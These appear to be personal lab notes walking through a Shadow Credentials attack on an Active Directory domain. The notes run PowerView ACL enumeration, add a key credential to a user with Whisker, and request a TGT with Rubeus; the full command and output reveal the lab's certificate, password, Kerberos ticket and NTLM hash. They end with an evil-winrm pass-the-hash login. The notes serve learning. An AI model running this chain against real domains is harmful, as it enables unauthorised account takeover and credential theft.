
Shadow Credentials Attacks exploits that machine accounts can store certificates.


Windows Hello for Business (WHfB) replaces password use with a public keys stored in the computers AD attribute `msDS-KeyCredentialLink`.
The public key is part of a pair made by the TPM (Trusted Platform Module) on the motherboard of the client PC. The private key never leaves the TPM.
`msDS-KeyCredentialLink` is added when a new device is added.

To authenticate, the client sends a request (CSR) for a certificate to the CA (The organization's certificate issuing authority).

Request:
![[Pasted image 20240227204256.png]]

So if you can set the `msDS-KeyCredentialLink` you can get a certificate making it possible for you to act as the computer.


## Shadow Credentials attack


Enum stuff

Run `powershell -ep bypass` to "bypass the default policy for arbitrary PowerShell script execution" (add stuff)
First run PowerView.ps1
`Find-InterestingDomainAcl -ResolveGuids` lists all vulns

```sh
PS C:\Users\hr> cd C:\Users\hr\Desktop
PS C:\Users\hr\Desktop> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\hr\Desktop> . .\PowerView.ps1
PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

IdentityReferenceName ObjectDN                                                    ActiveDirectoryRights
--------------------- --------                                                    ---------------------
hr                    CN=Administrator,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite

PS C:\Users\hr\Desktop>
```

```sh
PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

IdentityReferenceName ObjectDN                                                    ActiveDirectoryRights
--------------------- --------                                                    ---------------------
hr                    CN=vansprinkles,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite
```

Here, vansprinkles is found as a vuln user.

Exploiting GenericWrite privilege

You can use Whisker to emulate adding a device and setting the `msDS-KeyCredentialLink` attribute.

`.\Whisker.exe add /target:vansprinkles`

^ giver us the full command for Rubeus

This creates a certificate that can be used with Rubeus to create a Kerberos token TGT for the found vulnerable user.

The the `NTLM` hash is in the output and can be used for "pass-the-hash" attacks.

run the Rubeus we got from Whisker

evil-winrm -i 10.10.180.17 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3 














Quick run

cd .\Desktop\

powershell -ep bypass

. .\PowerView.ps1

Find-InterestingDomainAcl -ResolveGuids

Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

.\Whisker.exe add /target:vansprinkles

![[Pasted image 20240227220044.png]]

```sh
PS C:\Users\hr\Desktop> .\Whisker.exe add /target:vansprinkles
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password 43cjVjlx9dpG8Mhb
[*] Searching for the target account
[*] Target user found: CN=vansprinkles,CN=Users,DC=AOC,DC=local
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 2a0ce305-8ea9-433a-a7a9-ee13c03391f5
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"43cjVjlx9dpG8Mhb" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
```

```sh
PS C:\Users\hr\Desktop> ./Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"43cjVjlx9dpG8Mhb" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=vansprinkles
[*] Building AS-REQ (w/ PKINIT preauth) for: 'AOC.local\vansprinkles'
[*] Using domain controller: fe80::483f:947c:d9d8:f320%5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      T0MubG9jYWw=

  ServiceName              :  krbtgt/AOC.local
  ServiceRealm             :  AOC.LOCAL
  UserName                 :  vansprinkles
  UserRealm                :  AOC.LOCAL
  StartTime                :  2/27/2024 8:53:55 PM
  EndTime                  :  2/28/2024 6:53:55 AM
  RenewTill                :  3/5/2024 8:53:55 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  fgGItPC7y7QqvOkH+6TxiA==
  ASREP (key)              :  C2604884CED73E7241F0C75E9F04A413

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 03E805D8A8C5AA435FB48832DAD620E3
PS C:\Users\hr\Desktop>
```